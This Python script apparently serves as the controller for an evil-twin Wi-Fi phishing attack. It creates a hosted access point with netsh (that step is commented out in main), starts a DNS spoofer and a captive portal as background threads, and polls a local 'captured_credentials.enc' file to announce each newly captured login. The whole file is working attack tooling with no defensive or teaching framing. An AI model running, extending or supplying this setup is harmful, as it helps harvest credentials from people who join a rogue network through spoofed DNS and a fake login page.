import subprocess
import threading
import time
import os
import json

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
CRED_FILE = os.path.join(os.path.dirname(__file__), 'login_details', 'captured_credentials.enc')

def start_wifi_ap(ssid, password):
    try:
        subprocess.run(['netsh', 'wlan', 'stop', 'hostednetwork'], capture_output=True)
    except:
        pass
    cmd_set = ['netsh', 'wlan', 'set', 'hostednetwork', 'mode=allow', f'ssid={ssid}']
    if password:
        cmd_set.append(f'key={password}')
    subprocess.run(cmd_set, check=True)
    subprocess.run(['netsh', 'wlan', 'start', 'hostednetwork'], check=True)
    print(f"[*] Wi-Fi AP '{ssid}' started.")

def start_dns_server():
    def run():
        subprocess.run(['python', 'dns_spoofer.py'])
    t = threading.Thread(target=run, daemon=True)
    t.start()
    print("[*] DNS spoofing server started.")
    return t

def start_captive_portal():
    def run():
        subprocess.run(['python', 'portal/app.py'])
    t = threading.Thread(target=run, daemon=True)
    t.start()
    print("[*] Captive portal started.")
    return t

def monitor_and_log():
    last_size = 0
    while True:
        try:
            if os.path.exists(CRED_FILE):
                size = os.path.getsize(CRED_FILE)
                if size > last_size:
                    print("[*] New credentials captured and saved locally.")
                    last_size = size
        except Exception as e:
            print(f"[!] Monitor error: {e}")
        time.sleep(10)

def main():
    with open(CONFIG_PATH) as f:
        config = json.load(f)

    # try:
    #     start_wifi_ap(config['ssid'], config['wifi_password'])
    # except Exception as e:
    #     print(f"[!] Failed to start Wi-Fi AP: {e}")

    start_dns_server()
    start_captive_portal()

    monitor_and_log()

if __name__ == '__main__':
    main()
